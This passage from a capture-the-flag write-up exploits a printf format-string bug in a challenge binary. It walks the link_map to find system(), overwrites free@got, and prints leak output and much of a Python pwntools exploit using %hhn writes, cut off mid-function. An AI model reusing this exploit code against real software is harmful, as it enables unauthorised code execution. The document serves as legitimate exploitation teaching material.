+<p>And then nothing?! We overwrote the free() got pointer with puts and this dumped more text, convincing us that the overwrite was working correctly. This lead us to believe the binary was broken&hellip; Which indeed it turned out to be, later on.</p>
+
+<p>Next, loads of failed attempts later, we stumbled upon <a href="https://wapiflapi.github.io/2014/11/17/hacklu-oreo-with-ret2dl-resolve/">this writeup of another challenge</a> that uses ret2dl. In other words, abuse the symbol resolver. Quickly after that, we found another good writeup, using a slightly easier technique. It <a href="https://github.com/mrmacete/writeups/tree/master/wapiflapi-exrs/sploit/s7">traverses the link_map</a> found in memory to grab <code>system()</code>.</p>
+
+<p>This turned out to work. We traversed the link_map by hand, adjusting the leaked bytes from time to time (remember, printf chokes on nul bytes).</p>
+
+<p>At the start of the got, we find these bytes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0x13371f14 ; .dynamic
+</span><span class='line'>0xb7fff938 ; *link_map
+</span><span class='line'>0xb7ff24f0 ; *dl-resolve</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We take 0xb7fff938, the *link_map, and dump from there. link_map looks like this:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="k">struct</span> <span class="n">link_map</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>    <span class="cm">/* These first few members are part of the protocol with the debugger.</span>
+</span><span class='line'><span class="cm">       This is the same format used in SVR4.  */</span>
+</span><span class='line'>
+</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Addr</span><span class="p">)</span> <span class="n">l_addr</span><span class="p">;</span>          <span class="cm">/* Base address shared object is loaded at.  */</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="o">*</span><span class="n">l_name</span><span class="p">;</span>               <span class="cm">/* Absolute file name object was found in.  */</span>
+</span><span class='line'>    <span class="n">ElfW</span><span class="p">(</span><span class="n">Dyn</span><span class="p">)</span> <span class="o">*</span><span class="n">l_ld</span><span class="p">;</span>            <span class="cm">/* Dynamic section of the shared object.  */</span>
+</span><span class='line'>    <span class="k">struct</span> <span class="n">link_map</span> <span class="o">*</span><span class="n">l_next</span><span class="p">,</span> <span class="o">*</span><span class="n">l_prev</span><span class="p">;</span> <span class="cm">/* Chain of loaded objects.  */</span>
+</span><span class='line'>  <span class="p">};</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So at 0xb7fff938 we find:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="mh">0x746e450a</span> <span class="p">;</span> <span class="n">base_addr</span><span class="p">..</span> <span class="n">not</span> <span class="n">correct</span> <span class="n">due</span> <span class="n">to</span> <span class="n">printf</span>
+</span><span class='line'><span class="mh">0xb7fffc24</span> <span class="p">;</span> <span class="n">name</span><span class="o">!</span> <span class="n">empty</span>
+</span><span class='line'><span class="mh">0x13371f14</span> <span class="p">;</span> <span class="n">the</span> <span class="n">bin</span> <span class="n">itself</span><span class="p">...</span> <span class="n">not</span> <span class="n">useful</span><span class="p">.</span>
+</span><span class='line'><span class="mh">0xb7fffc28</span> <span class="p">;</span> <span class="n">ptr</span><span class="o">-&gt;</span><span class="n">next</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This is the binary. On to the next one at 0xb7fffc28, which was linux-gate&hellip; Then the next one was indeed libc! This was confirmed by reading link_map->l_name. We now had the dynamic section of libc, time to parse it for system. Soon, using the printf format string vulnerability and a messy python script, we were dumping symbols. After about an hour, we hit the jackpot:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">Opening</span> <span class="n">connection</span> <span class="n">to</span> <span class="n">challs</span><span class="p">.</span><span class="n">ctf</span><span class="p">.</span><span class="n">site</span> <span class="n">on</span> <span class="n">port</span> <span class="mi">20002</span><span class="o">:</span> <span class="n">Done</span>
+</span><span class='line'><span class="mh">0xb7e2dec8</span> <span class="mh">0x0</span>
+</span><span class='line'><span class="mh">0xb7e2ded8</span> <span class="mh">0x1da8</span>
+</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
+</span><span class='line'><span class="mh">0x0</span>
+</span><span class='line'><span class="mh">0xb7e2dee8</span> <span class="mh">0xbde</span>
+</span><span class='line'><span class="mi">1819570783</span> <span class="n">_rtl</span>
+</span><span class='line'><span class="mh">0x0</span>
+</span><span class='line'><span class="mh">0xb7e2def8</span> <span class="mh">0x45d1</span>
+</span><span class='line'><span class="mi">1768709983</span> <span class="n">__li</span>
+</span><span class='line'><span class="mh">0x0</span>
+</span><span class='line'><span class="mh">0xb7e2df08</span> <span class="mh">0x13f4</span>
+</span><span class='line'><span class="p">...</span>
+</span><span class='line'><span class="mh">0xb7e2f948</span> <span class="mh">0x3176</span>
+</span><span class='line'><span class="n">signal</span>
+</span><span class='line'><span class="mh">0xb7e2f9a8</span> <span class="mh">0xeab</span>
+</span><span class='line'><span class="n">puts</span>
+</span><span class='line'><span class="mh">0xb7e30208</span> <span class="mh">0xa3e</span>
+</span><span class='line'><span class="o">&lt;</span><span class="n">empty</span><span class="o">&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="mh">0xb7e30588</span> <span class="mh">0x3063</span>
+</span><span class='line'><span class="n">__libc_system</span>
+</span><span class='line'><span class="n">Enter</span> <span class="n">your</span> <span class="nl">name</span><span class="p">:</span>
+</span><span class='line'><span class="p">[</span><span class="o">!</span><span class="p">]</span> <span class="n">found</span> <span class="n">system</span><span class="o">!</span><span class="mh">0x3fcd0</span> <span class="mh">0xb7e69cd0</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We had the address of system! Now, the plan of attack was as follows:</p>
+
+<ul>
+<li>overwrite free@got with system</li>
+<li>set strcmp to the <code>xor eax, eax; ret</code> gadget</li>
+<li>supply <code>/bin/sh</code> as input</li>
+<li>trigger free() with input, which is now system()</li>
+<li>receive shell</li>
+</ul>
+
+
+<p>This <em>almost</em> worked out, but we set strcmp to 0xb7f61f60 and that turned out to be enough. We landed a shell!</p>
+
+<p>The poc we used:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="kn">import</span> <span class="nn">socket</span><span class="o">,</span> <span class="nn">struct</span><span class="o">,</span> <span class="nn">telnetlib</span><span class="o">,</span> <span class="nn">time</span>
+</span><span class='line'><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span><span class='line'>
+</span><span class='line'><span class="n">context</span><span class="p">(</span><span class="n">arch</span><span class="o">=</span><span class="s">&#39;i386&#39;</span><span class="p">,</span> <span class="n">os</span><span class="o">=</span><span class="s">&#39;linux&#39;</span><span class="p">)</span>
+</span><span class='line'><span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
+</span><span class='line'>        <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&#39;&lt;I&#39;</span><span class="p">,</span> <span class="n">x</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">read1</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">if</span> <span class="n">data</span><span class="p">[</span><span class="mi">4</span><span class="p">:</span><span class="mi">7</span><span class="p">]</span> <span class="o">==</span> <span class="s">&#39;Ent&#39;</span><span class="p">:</span>
+</span><span class='line'>      <span class="k">return</span> <span class="mi">0</span>
+</span><span class='line'>  <span class="k">return</span> <span class="nb">ord</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">4</span><span class="p">])</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">read4</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">value</span> <span class="o">=</span> <span class="mi">0</span>
+</span><span class='line'>  <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">4</span><span class="p">):</span>
+</span><span class='line'>      <span class="c">#value &lt;&lt;= 8</span>
+</span><span class='line'>      <span class="n">value</span> <span class="o">+=</span> <span class="n">read1</span><span class="p">(</span><span class="n">address</span><span class="o">+</span><span class="n">i</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="p">(</span><span class="mi">8</span><span class="o">*</span><span class="n">i</span><span class="p">)</span>
+</span><span class='line'>      
+</span><span class='line'>  <span class="k">return</span> <span class="n">value</span>
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">address</span><span class="p">):</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>  
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">):</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
+</span><span class='line'>      <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">address</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%124$s&quot;</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="k">return</span> <span class="n">data</span><span class="p">[</span><span class="mi">3</span><span class="p">:]</span>
+</span><span class='line'>
+</span><span class='line'><span class="k">def</span> <span class="nf">write1</span><span class="p">(</span><span class="n">what</span><span class="p">,</span> <span class="n">where</span><span class="p">):</span>
+</span><span class='line'><span class="c">#       argument 25 contains 0xbffff844,</span>
+</span><span class='line'><span class="c">#                               which points to 0xbffff958</span>
+</span><span class='line'><span class="c">#       so we can use 25 to modify position 61 to write something on the stack!</span>
+</span><span class='line'><span class="c">#       addr = 0xbffff758 # = argument 2</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%64c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># 0xbffff940</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">where</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..40 to &#39;3c&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%65c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff941</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..41 to &#39;20&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%66c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># next byte, 0xbffff942</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..42 to &#39;37&#39;</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">300</span><span class="p">)</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;</span><span class="si">%67c</span><span class="s">%25$hhn&quot;</span><span class="p">)</span>           <span class="c"># final byte, 0xbffff943</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">200</span><span class="p">)</span>
+</span><span class='line'>  <span class="n">conn</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&quot;%&quot;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">where</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;c%61$hhn&quot;</span><span class="p">)</span>           <span class="c"># set byte at 0xbf..43 to &#39;13&#39;</span>
